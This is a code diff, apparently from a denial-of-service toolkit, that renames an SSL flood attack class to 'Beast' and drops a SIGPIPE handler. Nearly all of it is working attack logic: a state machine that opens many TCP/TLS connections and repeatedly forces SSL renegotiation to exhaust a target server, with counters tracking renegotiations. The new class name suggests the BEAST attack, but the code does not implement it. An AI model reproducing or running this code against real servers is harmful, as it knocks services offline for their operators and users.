@@ -1,12 +1,11 @@
-#include "Ssl_Flood.hpp"
+#include "Beast.hpp"
 #include <csignal>
 
-Ssl_Flood::Ssl_Flood(const config *conf, Logger *logger) : Attack_Vector(conf, logger) {
+Beast::Beast(const config *conf, Logger *logger) : Attack_Vector(conf, logger) {
 
 }
 
-void Ssl_Flood::attack(const int *id) {
-    signal(SIGPIPE, &Ssl_Flood::broke);
+void Beast::attack(const int *id) {
     std::string message{};
     init();
     fd_set rfds;
@@ -61,7 +60,7 @@ void Ssl_Flood::attack(const int *id) {
 
 }
 
-void Ssl_Flood::init() {
+void Beast::init() {
     opt.n_max_peers = static_cast<uint16_t>(conf->CONNECTIONS);
     FD_ZERO(&opt.rfds);
     FD_ZERO(&opt.wfds);
@@ -80,7 +79,7 @@ void Ssl_Flood::init() {
     }
 }
 
-void Ssl_Flood::SSL_set_rw(_peer *p, int ret) {
+void Beast::SSL_set_rw(_peer *p, int ret) {
     int err;
     err = SSL_get_error(p->ssl, ret);
     switch (err){
@@ -103,7 +102,7 @@ void Ssl_Flood::SSL_set_rw(_peer *p, int ret) {
     }
 }
 
-int Ssl_Flood::ssl_handshake_io(_peer *p) {
+int Beast::ssl_handshake_io(_peer *p) {
     int ret;
     char buf[1024];
     while (true){
@@ -136,7 +135,7 @@ int Ssl_Flood::ssl_handshake_io(_peer *p) {
     return 0;
 }
 
-int Ssl_Flood::ssl_connect_io(_peer *p) {
+int Beast::ssl_connect_io(_peer *p) {
     int ret = SSL_connect(p->ssl);
     if(ret == 1){
         opt.stat.total_ssl_connect++;
@@ -149,7 +148,7 @@ int Ssl_Flood::ssl_connect_io(_peer *p) {
     return 0;
 }
 
-int Ssl_Flood::ssl_dummywrite_io(_peer *p) {
+int Beast::ssl_dummywrite_io(_peer *p) {
     char c = 0;
     int ret = SSL_write(p->ssl, &c, 1);
     if(ret == 1){
@@ -161,12 +160,12 @@ int Ssl_Flood::ssl_dummywrite_io(_peer *p) {
     return 0;
 }
 
-void Ssl_Flood::PEER_SSL_dummywrite(_peer *p) {
+void Beast::PEER_SSL_dummywrite(_peer *p) {
     p->state = SSL_DUMMYWRITE;
     ssl_dummywrite_io(p);
 }
 
-void Ssl_Flood::PEER_SSL_renegotiate(_peer *p) {
+void Beast::PEER_SSL_renegotiate(_peer *p) {
     int ret = SSL_renegotiate(p->ssl);
     if(ret != 1){
         opt.stat.error_count++;
@@ -177,21 +176,21 @@ void Ssl_Flood::PEER_SSL_renegotiate(_peer *p) {
     ssl_handshake_io(p);
 }
 
-void Ssl_Flood::PEER_SSL_connect(_peer *p) {
+void Beast::PEER_SSL_connect(_peer *p) {
     p->ssl = SSL_new(opt.ctx);
     SSL_set_fd(p->ssl, p->sox);
     p->state = SSL_CONNECTING;
     ssl_connect_io(p);
 }
 
-void Ssl_Flood::PEER_connect(_peer *p) {
+void Beast::PEER_connect(_peer *p) {
     if (tcp_connect(p) != 0){
         logger->Log("Tcp_connect()", Logger::Error);
         exit(EXIT_FAILURE);
     }
 }
 
-void Ssl_Flood::PEER_disconnect(_peer *p) {
+void Beast::PEER_disconnect(_peer *p) {
     if(p->ssl != nullptr){
         SSL_free(p->ssl);
         p->ssl = nullptr;
@@ -206,15 +205,15 @@ void Ssl_Flood::PEER_disconnect(_peer *p) {
     p->flags = FL_PEER_WANT_NEXT_STATE;
 }
 
-void Ssl_Flood::PEER_read(_peer *p) {
+void Beast::PEER_read(_peer *p) {
     CompleteState(p);
 }
 
-void Ssl_Flood::PEER_write(_peer *p) {
+void Beast::PEER_write(_peer *p) {
     CompleteState(p);
 }
 
-int Ssl_Flood::tcp_connect_io(_peer *p) {
+int Beast::tcp_connect_io(_peer *p) {
     int ret;
     socklen_t len;
     len = 4;
@@ -223,7 +222,7 @@ int Ssl_Flood::tcp_connect_io(_peer *p) {
     return ret;
 }
 
-int Ssl_Flood::tcp_connect_try_finish(_peer *p, int ret) {
+int Beast::tcp_connect_try_finish(_peer *p, int ret) {
     if(ret != 0){
         if((errno != EINPROGRESS) && (errno != EAGAIN)){
             if(opt.stat.total_tcp_connections <= 0){
@@ -244,7 +243,7 @@ int Ssl_Flood::tcp_connect_try_finish(_peer *p, int ret) {
     return 0;
 }
 
-int Ssl_Flood::tcp_connect(_peer *p) {
+int Beast::tcp_connect(_peer *p) {
     int ret;
     p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(p->sox < 0){
@@ -266,7 +265,7 @@ int Ssl_Flood::tcp_connect(_peer *p) {
     return ret;
 }
 
-void Ssl_Flood::NextState(_peer *p) {
+void Beast::NextState(_peer *p) {
     p->flags &= ~FL_PEER_WANT_NEXT_STATE;
     switch (p->state){
         case TCP_CONNECTING:
@@ -282,7 +281,7 @@ void Ssl_Flood::NextState(_peer *p) {
     }
 }
 
-void Ssl_Flood::CompleteState(_peer *p) {
+void Beast::CompleteState(_peer *p) {
     int ret;
     switch (p->state){
         case TCP_CONNECTING:
@@ -328,7 +327,7 @@ void Ssl_Flood::CompleteState(_peer *p) {
     }
 }
 
-uint64_t Ssl_Flood::getusec(struct timeval *tv) {
+uint64_t Beast::getusec(struct timeval *tv) {
     struct timeval tv_l{};
     if(tv == nullptr){
         tv = &tv_l;
@@ -337,7 +336,7 @@ uint64_t Ssl_Flood::getusec(struct timeval *tv) {
     return static_cast<uint64_t>(tv->tv_sec * 1000000 + tv->tv_usec);
 }
 
-void Ssl_Flood::update_stat(struct timeval *tv) {
+void Beast::update_stat(struct timeval *tv) {
     uint64_t usec_now = getusec(tv);
     int32_t conn = 0;
     for(int i = 0; i < opt.n_peers; i++){
@@ -350,8 +349,4 @@ void Ssl_Flood::update_stat(struct timeval *tv) {
     }
     opt.stat.epoch_start_renegotiations = opt.stat.total_renegotiations;
     opt.stat.epoch_start_usec = usec_now;
-}
-
-void Ssl_Flood::broke(int) {
-    // pass
 }
